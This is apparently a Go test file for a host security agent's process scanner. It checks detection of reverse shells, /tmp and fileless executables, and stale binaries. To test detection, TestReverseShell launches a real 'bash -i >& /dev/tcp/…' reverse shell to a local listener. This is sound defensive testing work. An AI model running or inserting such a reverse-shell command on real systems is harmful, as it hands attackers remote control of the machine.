package procscan

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/xyfu/xnux-agent/internal/procfs"
	"github.com/xyfu/xnux-agent/internal/raw"
)

func TestDecodeAddr(t *testing.T) {
	for in, want := range map[string]string{
		"0100007F:1F90":                         "127.0.0.1:8080",
		"0000000000000000FFFF00000100007F:0016": "127.0.0.1:22",
		"B80D01200000000000000000EFBEADDE:115C": "[2001:db8::dead:beef]:4444",
		"zz:1":                                  "",
	} {
		if got := decodeAddr(in); got != want {
			t.Errorf("decodeAddr(%s) = %q, want %q", in, got, want)
		}
	}
}

// scanner scans this host; Self is no real process, so the test's own
// children count like anyone's.
func scanner() *Scanner {
	return &Scanner{Proc: procfs.FS{Root: "/proc"}, Root: "/", Self: -1}
}

func find(recs []raw.Record, pid int) *raw.Record {
	for i := range recs {
		if recs[i].Data["pid"] == pid {
			return &recs[i]
		}
	}
	return nil
}

// copyBinary copies sleep(1) into dir so it can be run from there.
// TestMain lets a copy of the test binary stand in for a long-running
// program under any name: the system's sleep may be a multi-call binary
// (uutils coreutils on Ubuntu 26.04) that exits when run as "miner".
func TestMain(m *testing.M) {
	if os.Getenv(sleepEnv) != "" {
		time.Sleep(30 * time.Second)
		os.Exit(0)
	}
	os.Exit(m.Run())
}

const sleepEnv = "XNUX_PROCSCAN_SLEEP"

// copyBinary copies the test binary to dir/name; run starts it sleeping.
func copyBinary(t *testing.T, dir, name string) string {
	t.Helper()
	src, err := os.Executable()
	if err != nil {
		t.Skip(err)
	}
	in, err := os.Open(src)
	if err != nil {
		t.Fatal(err)
	}
	defer in.Close()
	dst := filepath.Join(dir, name)
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0o755)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := io.Copy(out, in); err != nil {
		t.Fatal(err)
	}
	out.Close()
	return dst
}

func run(t *testing.T, name string, args ...string) *exec.Cmd {
	t.Helper()
	cmd := exec.Command(name, args...)
	cmd.Env = append(os.Environ(), sleepEnv+"=1")
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = cmd.Process.Kill(); _ = cmd.Wait() })
	time.Sleep(100 * time.Millisecond) // let exec finish
	return cmd
}

// F4-5 acceptance: `bash -i >& /dev/tcp/…` is detected.
func TestReverseShell(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("no bash")
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	port := ln.Addr().(*net.TCPAddr).Port
	cmd := run(t, "bash", "-c", "exec bash -i >& /dev/tcp/127.0.0.1/"+strconv.Itoa(port)+" 0>&1")
	if err := ln.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatal(err)
	}
	conn, err := ln.Accept()
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()

	// The shell may still be wiring fds 0–2 when the connection is accepted.
	s := scanner()
	var r *raw.Record
	for i := 0; i < 20 && r == nil; i++ {
		start := time.Now()
		recs := s.Scan()
		t.Logf("scan with %d findings took %v", len(recs), time.Since(start))
		r = find(recs, cmd.Process.Pid)
		if r == nil {
			time.Sleep(50 * time.Millisecond)
		}
	}
	if r == nil || r.Kind != "proc_reverse_shell" || r.Severity != "P0" || r.Data["remote"] != "127.0.0.1:"+strconv.Itoa(port) {
		t.Fatalf("reverse shell not reported: %+v", r)
	}
	if !strings.Contains(r.Data["cmdline"].(string), "bash") {
		t.Fatalf("cmdline: %+v", r.Data)
	}
	// The binary's path is kept and is the key (decision L20).
	if exe, _ := r.Data["exe"].(string); exe == "" || !strings.HasSuffix(exe, "bash") || r.Key != exe {
		t.Fatalf("exe %q, key %q", r.Data["exe"], r.Key)
	}
	// Reported once per process.
	if again := find(s.Scan(), cmd.Process.Pid); again != nil {
		t.Fatal("reported twice")
	}
}

func TestTmpAndDeleted(t *testing.T) {
	tmp, err := os.MkdirTemp("/tmp", "xnux-procscan-")
	if err != nil {
		t.Skip(err)
	}
	defer os.RemoveAll(tmp)
	// Not under a temp directory: the package directory itself.
	stable, err := os.MkdirTemp(".", "bin-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(stable)
	abs, _ := filepath.Abs(stable)

	inTmp := run(t, copyBinary(t, tmp, "miner"), "30")
	gone := copyBinary(t, tmp, "dropper")
	fileless := run(t, gone, "30")
	os.Remove(gone)

	upgraded := copyBinary(t, abs, "daemon")
	stale := run(t, upgraded, "30")
	os.Remove(upgraded)
	copyBinary(t, abs, "daemon") // the package manager put a new file there

	removed := copyBinary(t, abs, "orphan")
	deletedExe := run(t, removed, "30")
	os.Remove(removed)

	s := scanner()
	recs := s.Scan()
	for _, c := range []struct {
		cmd       *exec.Cmd
		kind, sev string
	}{
		{inTmp, "proc_tmp_exec", "P2"},
		{fileless, "proc_fileless", "P1"},
		{stale, "proc_stale_binary", "P3"},
		{deletedExe, "proc_deleted_exe", "P2"},
	} {
		r := find(recs, c.cmd.Process.Pid)
		if r == nil || r.Kind != c.kind || r.Severity != c.sev {
			t.Errorf("pid %d: got %+v, want %s %s", c.cmd.Process.Pid, r, c.kind, c.sev)
		}
	}

	// As whom it runs (thread 0029): real and effective uid; caps only for
	// root here (an ordinary user's process holds none).
	if r := find(recs, inTmp.Process.Pid); r != nil {
		if r.Data["uid"] != os.Getuid() || r.Data["euid"] != os.Geteuid() {
			t.Errorf("uid %v euid %v, want %d %d", r.Data["uid"], r.Data["euid"], os.Getuid(), os.Geteuid())
		}
		if _, caps := r.Data["caps"]; caps != (os.Geteuid() == 0) {
			t.Errorf("caps %v as euid %d", r.Data["caps"], os.Geteuid())
		}
	}

	// A stale binary is reported once a day per path, even for a new process.
	run(t, upgraded, "30")
	s2 := scanner()
	s2.SetStale(s.Stale())
	for _, r := range s2.Scan() {
		if r.Kind == "proc_stale_binary" {
			t.Errorf("stale binary reported again within a day: %+v", r)
		}
	}

	// After a restart the same running processes are not reported again;
	// after a reboot (another boot ID) they are.
	s4 := scanner()
	s4.SetReported(s.Reported())
	if r := find(s4.Scan(), inTmp.Process.Pid); r != nil {
		t.Errorf("reported again after a restart: %+v", r)
	}
	if rep := s.Reported(); rep != nil {
		rep.BootID = "another-boot"
		s5 := scanner()
		s5.SetReported(rep)
		if r := find(s5.Scan(), inTmp.Process.Pid); r == nil {
			t.Error("not reported after a reboot")
		}
	} else if _, err := os.Stat("/proc/sys/kernel/random/boot_id"); err == nil {
		t.Error("nothing to persist")
	}

	// Whitelisted by comm.
	s3 := scanner()
	s3.WhitelistComm = []string{"miner"}
	if r := find(s3.Scan(), inTmp.Process.Pid); r != nil {
		t.Errorf("whitelisted process reported: %+v", r)
	}
}

// Not judged (thread 0046): the kernel's user-mode helpers (bpfilter_umh,
// a child of kthreadd: exe "/ (deleted)", comm "none"), the agent and its
// children, and a deleted executable whose old path is no longer a file.
// A real stale binary still is.
func TestSkipsKernelHelpersAndSelf(t *testing.T) {
	root := t.TempDir()
	proc := filepath.Join(root, "proc")
	if err := os.MkdirAll(filepath.Join(root, "usr/bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "usr/bin/daemon"), []byte("new build"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(root, "opt/tool"), 0o755); err != nil {
		t.Fatal(err)
	}
	fake := func(pid, ppid int, comm, exe string) {
		t.Helper()
		dir := filepath.Join(proc, strconv.Itoa(pid))
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		_ = os.WriteFile(filepath.Join(dir, "comm"), []byte(comm+"\n"), 0o644)
		_ = os.WriteFile(filepath.Join(dir, "status"), []byte(fmt.Sprintf("Name:\t%s\nPPid:\t%d\nUid:\t0\t0\t0\t0\n", comm, ppid)), 0o644)
		_ = os.WriteFile(filepath.Join(dir, "stat"), []byte(fmt.Sprintf("%d (%s) S %d 0 0 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 %d 0 0", pid, comm, ppid, 1000+pid)), 0o644)
		if exe != "" {
			if err := os.Symlink(exe, filepath.Join(dir, "exe")); err != nil {
				t.Fatal(err)
			}
		}
	}
	fake(2, 0, "kthreadd", "")
	fake(300, 2, "none", "/ (deleted)")                       // bpfilter_umh
	fake(301, 1, "oddball", "/ (deleted)")                    // "/" even without kthreadd
	fake(302, 1, "tool", "/opt/tool (deleted)")               // old path is now a directory
	fake(400, 1, "xnux-agent", "/usr/bin/daemon (deleted)")   // the agent itself
	fake(401, 400, "journalctl", "/usr/bin/daemon (deleted)") // its child
	fake(500, 1, "daemon", "/usr/bin/daemon (deleted)")       // upgraded, not restarted

	s := &Scanner{Proc: procfs.FS{Root: proc}, Root: root, Self: 400}
	recs := s.Scan()
	if len(recs) != 1 || recs[0].Data["pid"] != 500 || recs[0].Kind != "proc_stale_binary" {
		t.Fatalf("records: %+v", recs)
	}
}
